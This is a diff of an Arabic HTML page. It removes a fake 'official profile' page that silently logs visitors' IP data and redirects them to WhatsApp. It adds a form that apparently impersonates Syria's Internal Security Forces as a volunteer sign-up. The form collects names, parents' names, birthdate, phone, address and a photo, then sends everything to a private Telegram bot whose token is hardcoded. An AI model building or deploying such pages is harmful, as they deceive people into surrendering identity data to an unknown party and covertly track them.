@@ -1,34 +1,283 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>هند العزاوي - الصفحة الرسمية</title>
-  <link rel="stylesheet" href="style.css">
-  <script>
-    // تسجيل بيانات الزائر
-    fetch('https://ipinfo.io/json')
-      .then(response => response.json())
-      .then(data => {
-        fetch('log.php', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify(data)
-        });
-      });
-
-    // تحويل تلقائي إلى واتساب بعد 5 ثواني
-    setTimeout(() => {
-      window.location.href = "https://wa.me/963943820819?text=مرحبا";
-    }, 5000);
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج التطوع في قوى الأمن الداخلي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #d9534f;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"],
+        input[type="date"],
+        input[type="file"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .radio-group {
+            display: flex;
+            gap: 20px;
+        }
+        .radio-option {
+            display: flex;
+            align-items: center;
+        }
+        .radio-option input {
+            margin-left: 8px;
+        }
+        button {
+            background-color: #d9534f;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #c9302c;
+        }
+        .required {
+            color: #d9534f;
+        }
+        #status {
+            text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <img src="https://i.imgur.com/4M7IWwP.png" alt="هند العزاوي" class="avatar">
-    <h2>هند العزاوي</h2>
-    <p>🌟 أهلاً بك في الصفحة الرسمية 🌟</p>
-    <p>جارٍ التحويل إلى المحادثة الخاصة...</p>
-    <div class="loader"></div>
-  </div>
+    <div class="container">
+        <h1>نموذج التطوع في قوى الأمن الداخلي</h1>
+        <form id="volunteerForm">
+            <div class="form-group">
+                <label for="name">الاسم <span class="required">*</span></label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="surname">الكنية <span class="required">*</span></label>
+                <input type="text" id="surname" name="surname" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="father">اسم الأب <span class="required">*</span></label>
+                <input type="text" id="father" name="father" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="mother">اسم الأم <span class="required">*</span></label>
+                <input type="text" id="mother" name="mother" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="birthdate">تاريخ الميلاد <span class="required">*</span></label>
+                <input type="date" id="birthdate" name="birthdate" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">رقم الهاتف للتواصل <span class="required">*</span></label>
+                <input type="tel" id="phone" name="phone" required placeholder="مثال: 0999123456">
+            </div>
+            
+            <div class="form-group">
+                <label for="address">السكن الحالي <span class="required">*</span></label>
+                <input type="text" id="address" name="address" required>
+            </div>
+            
+            <div class="form-group">
+                <label>هل أنت مقيم في سوريا؟ <span class="required">*</span></label>
+                <div class="radio-group">
+                    <div class="radio-option">
+                        <input type="radio" id="resident-yes" name="resident" value="نعم" required>
+                        <label for="resident-yes">نعم</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="resident-no" name="resident" value="لا">
+                        <label for="resident-no">لا</label>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="province">في أي محافظة ترغب في الانتساب؟ <span class="required">*</span></label>
+                <select id="province" name="province" required>
+                    <option value="">-- اختر المحافظة --</option>
+                    <option value="دمشق">دمشق</option>
+                    <option value="ريف دمشق">ريف دمشق</option>
+                    <option value="حلب">حلب</option>
+                    <option value="حمص">حمص</option>
+                    <option value="حماة">حماة</option>
+                    <option value="اللاذقية">اللاذقية</option>
+                    <option value="طرطوس">طرطوس</option>
+                    <option value="دير الزور">دير الزور</option>
+                    <option value="الحسكة">الحسكة</option>
+                    <option value="الرقة">الرقة</option>
+                    <option value="إدلب">إدلب</option>
+                    <option value="السويداء">السويداء</option>
+                    <option value="درعا">درعا</option>
+                    <option value="القنيطرة">القنيطرة</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="photo">إرفاق صورة شخصية <span class="required">*</span></label>
+                <input type="file" id="photo" name="photo" accept="image/*" required>
+            </div>
+            
+            <button type="submit">إرسال الطلب</button>
+            <div id="status"></div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('volunteerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const photoInput = document.getElementById('photo');
+            const statusDiv = document.getElementById('status');
+            const phoneInput = document.getElementById('phone');
+            
+            // تحقق من رقم الهاتف
+            const phoneRegex = /^09\d{8}$/;
+            if (!phoneRegex.test(phoneInput.value)) {
+                statusDiv.textContent = 'الرجاء إدخال رقم هاتف سوري صحيح (يبدأ بـ 09 ويتكون من 10 أرقام)';
+                statusDiv.style.color = 'red';
+                return;
+            }
+            
+            // تحقق من أن الملف المرفوع هو صورة
+            if (photoInput.files.length > 0) {
+                const file = photoInput.files[0];
+                if (!file.type.match('image.*')) {
+                    statusDiv.textContent = 'الرجاء إرفاق صورة صالحة';
+                    statusDiv.style.color = 'red';
+                    return;
+                }
+                
+                if (file.size > 5 * 1024 * 1024) {
+                    statusDiv.textContent = 'حجم الصورة يجب أن يكون أقل من 5MB';
+                    statusDiv.style.color = 'red';
+                    return;
+                }
+            }
+            
+            // إظهار رسالة تحميل
+            const button = document.querySelector('button');
+            button.disabled = true;
+            button.textContent = 'جاري إرسال البيانات...';
+            statusDiv.textContent = '';
+            
+            try {
+                // تجميع البيانات النصية
+                const textData = `
+                    📌 طلب جديد للتطوع في قوى الأمن الداخلي:
+                    
+                    الاسم: ${formData.get('name')}
+                    الكنية: ${formData.get('surname')}
+                    اسم الأب: ${formData.get('father')}
+                    اسم الأم: ${formData.get('mother')}
+                    تاريخ الميلاد: ${formData.get('birthdate')}
+                    رقم الهاتف: ${formData.get('phone')}
+                    السكن الحالي: ${formData.get('address')}
+                    مقيم في سوريا: ${formData.get('resident')}
+                    المحافظة المطلوبة: ${formData.get('province')}
+                `;
+                
+                // إرسال البيانات النصية إلى Telegram
+                const textResponse = await sendTextToTelegram(textData);
+                
+                if (textResponse.ok) {
+                    // إذا كانت هناك صورة، أرسلها كملف منفصل
+                    if (photoInput.files.length > 0) {
+                        await sendPhotoToTelegram(photoInput.files[0], formData.get('name'));
+                    }
+                    
+                    statusDiv.textContent = 'تم إرسال طلب التطوع بنجاح! شكراً لتقديمك.';
+                    statusDiv.style.color = 'green';
+                    this.reset();
+                } else {
+                    throw new Error(textResponse.description || 'فشل إرسال البيانات');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                statusDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.';
+                statusDiv.style.color = 'red';
+            } finally {
+                button.disabled = false;
+                button.textContent = 'إرسال الطلب';
+            }
+        });
+        
+        async function sendTextToTelegram(text) {
+            const telegramUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`;
+            
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '7493001551',
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            return await response.json();
+        }
+        
+        async function sendPhotoToTelegram(photoFile, name) {
+            const formData = new FormData();
+            formData.append('chat_id', '7493001551');
+            formData.append('photo', photoFile);
+            formData.append('caption', `الصورة الشخصية للمتطوع: ${name}`);
+            
+            const photoUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendPhoto`;
+            
+            const response = await fetch(photoUrl, {
+                method: 'POST',
+                body: formData
+            });
+            
+            return await response.json();
+        }
+    </script>
 </body>
 </html>
